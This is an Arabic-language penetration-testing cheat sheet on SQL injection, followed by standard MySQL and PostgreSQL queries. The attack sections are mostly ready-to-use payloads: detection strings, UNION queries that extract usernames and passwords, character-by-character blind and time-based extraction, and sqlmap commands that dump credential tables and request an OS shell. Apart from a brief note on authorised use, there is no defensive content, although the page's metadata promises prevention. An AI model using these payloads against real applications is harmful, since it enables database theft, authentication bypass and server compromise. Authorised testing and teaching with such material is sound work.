---
title: "حقن SQL واستعلامات قواعد البيانات: مرجع مختبري الاختراق"
description: "حمولات حقن SQL، هجمات UNION، تقنيات حقن SQL الأعمى، واستعلامات قياسية لـ MySQL و PostgreSQL. مرجع تكتيكي لمختبري الاختراق ومديري قواعد البيانات."
date: 2026-02-10
tags: ["sql-injection", "cheatsheet", "penetration-testing", "database", "security"]
keywords: ["حمولات حقن SQL", "ورقة غش أوامر MySQL", "ورقة غش PostgreSQL", "اختراق قواعد البيانات", "أوامر sqlmap", "حقن SQL بـ UNION", "حقن SQL الأعمى", "اختبار حقن SQL", "تعداد قواعد البيانات", "منع حقن SQL"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "حقن SQL واستعلامات قواعد البيانات: مرجع مختبري الاختراق",
    "description": "حمولات حقن SQL، هجمات UNION، حقن SQL الأعمى، واستعلامات لـ MySQL و PostgreSQL.",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "ar"
  }
---

## تهيئة النظام

يظل حقن SQL أحد أخطر الثغرات الأمنية في تطبيقات الويب — حيث يُصنف باستمرار ضمن قائمة OWASP العشر الأوائل. يحدث عندما يتم ربط مدخلات المستخدم مباشرة في استعلامات SQL دون تنقية مناسبة، مما يسمح للمهاجم بالتلاعب بمنطق استعلام قاعدة البيانات. يمكن أن يؤدي حقن SQL الناجح إلى تسريب كامل للبيانات، وتجاوز المصادقة، وتصعيد الامتيازات، وفي بعض الحالات، تنفيذ أوامر عن بُعد على خادم قاعدة البيانات. يوفر هذا الدليل الميداني كلاً من الحمولات الهجومية لاختبار الاختراق المرخص واستعلامات SQL القياسية التي يحتاج كل مدير قواعد بيانات لمعرفتها.

جميع تقنيات الحقن مخصصة للاختبار المرخص فقط. الوصول غير المصرح به غير قانوني.

---

## كشف SQLi

قبل استغلال ثغرة حقن SQL، تحتاج إلى تأكيد وجودها. يتضمن الكشف إرسال مدخلات مصممة خصيصاً إلى معاملات التطبيق ومراقبة الاستجابة بحثاً عن رسائل خطأ أو تغييرات سلوكية أو اختلافات زمنية. تخبرك هذه المجسات الأولية ما إذا كان المعامل قابلاً للحقن ونوع الحقن الممكن.

### حمولات الكشف الأساسية

```sql
-- Single quote test (triggers syntax error if vulnerable)
'

-- Double quote test
"

-- Comment-based detection
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Numeric injection test (always true vs always false)
1 OR 1=1
1 AND 1=2

-- String-based detection
' OR 'a'='a
' OR 'a'='a'--

-- Error-based detection (force a type conversion error)
' AND 1=CONVERT(int,(SELECT @@version))--

-- Time-based detection (if the response is delayed, injection exists)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### تحديد واجهة قاعدة البيانات الخلفية

```sql
-- MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- MSSQL
' UNION SELECT @@version--

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT sqlite_version()--
```

---

## هجمات UNION

حقن SQL المبني على UNION هو التقنية الأقوى عندما تُعرض رسائل الخطأ أو نتائج الاستعلام على الصفحة. يعمل عن طريق إلحاق عبارة `UNION SELECT` بالاستعلام الأصلي، مما يسمح لك باستخراج البيانات من أي جدول في قاعدة البيانات. المتطلب الأساسي هو تحديد العدد الصحيح للأعمدة في الاستعلام الأصلي حتى تتطابق عبارة UNION.

### تحديد عدد الأعمدة

```sql
-- Using ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (error at N means there are N-1 columns)

-- Using UNION SELECT with NULL placeholders
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- (no error means correct column count)
```

### استخراج البيانات

```sql
-- Find which columns are displayed on the page
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract current database name
' UNION SELECT NULL,database(),NULL--           -- MySQL
' UNION SELECT NULL,current_database(),NULL--   -- PostgreSQL

-- Extract current user
' UNION SELECT NULL,user(),NULL--               -- MySQL
' UNION SELECT NULL,current_user,NULL--         -- PostgreSQL

-- List all databases (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- List all tables in a database (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract usernames and passwords
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## حقن SQL الأعمى

عندما لا يعرض التطبيق نتائج الاستعلام أو رسائل الخطأ على الصفحة، فأنت تتعامل مع حقن SQL الأعمى. لا تزال الثغرة موجودة، لكن استخراج البيانات يتطلب الاستدلال — إما من خلال الشروط المنطقية (هل تتغير الصفحة؟) أو التأخيرات الزمنية (هل تستغرق الاستجابة وقتاً أطول؟). حقن SQL الأعمى أبطأ لكنه خطير بنفس القدر.

### الحقن الأعمى المبني على المنطق البولياني

```sql
-- Test if the first character of the database name is 'm'
' AND SUBSTRING(database(),1,1)='m'--

-- Test using ASCII values
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--

-- Binary search approach (faster than linear)
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- Is it > '@'?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- Is it > '`'?
' AND ASCII(SUBSTRING(database(),1,1))>112--   -- Is it > 'p'?
```

### الحقن الأعمى المبني على الوقت

```sql
-- MySQL: if condition is true, response is delayed by 5 seconds
' AND IF(1=1, SLEEP(5), 0)--

-- Extract data using time delays
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

---

## الأتمتة باستخدام SQLMap

SQLMap هو الأداة المعيارية في الصناعة للكشف والاستغلال الآلي لحقن SQL. يتعامل مع الكشف، وبصمة النظام، واستخراج البيانات، وحتى الوصول على مستوى نظام التشغيل من خلال حقن SQL — كل ذلك من سطر الأوامر. بالنسبة لاختبارات الاختراق المرخصة، يسرّع بشكل كبير مرحلة الاستغلال.

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the parameter to test
sqlmap -u "http://target.com/page?id=1" -p id

# Test POST request parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use a specific technique (B=Boolean, T=Time, U=Union, E=Error)
sqlmap -u "http://target.com/page?id=1" --technique=BU

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump

# Use cookies for authenticated scanning
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Increase verbosity and use threads
sqlmap -u "http://target.com/page?id=1" -v 3 --threads=5

# Try to get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## استعلامات SQL القياسية

بعيداً عن اختبار الحقن، يحتاج كل متخصص في الأمن ومطور إلى معرفة SQL القياسي لإدارة قواعد البيانات وتحليل السجلات واستخراج البيانات أثناء التحقيقات. تعمل هذه الاستعلامات على كل من MySQL و PostgreSQL وتغطي عمليات قواعد البيانات الأكثر شيوعاً.

### استعلامات SELECT

```sql
-- Select all records
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Pattern matching
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Order results
SELECT * FROM users ORDER BY created_at DESC;

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users LIMIT 10 OFFSET 20;

-- Count records
SELECT COUNT(*) FROM users WHERE active = true;

-- Distinct values
SELECT DISTINCT role FROM users;
```

### استعلامات JOIN

```sql
-- Inner join (only matching records)
SELECT u.username, o.order_id, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- Left join (all users, even without orders)
SELECT u.username, o.order_id
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.username, o.order_id, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### INSERT، UPDATE، DELETE

```sql
-- Insert a new record
INSERT INTO users (username, email, role)
VALUES ('newuser', 'user@example.com', 'user');

-- Update a record
UPDATE users SET role = 'admin' WHERE username = 'newuser';

-- Delete a record
DELETE FROM users WHERE username = 'olduser';

-- Delete all records (use with caution)
DELETE FROM users;
TRUNCATE TABLE users;
```

### إدارة قاعدة البيانات

```sql
-- Create a database
CREATE DATABASE myapp;

-- Create a table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add an index
CREATE INDEX idx_users_email ON users(email);

-- Grant privileges (MySQL)
GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

-- Grant privileges (PostgreSQL)
GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;
```
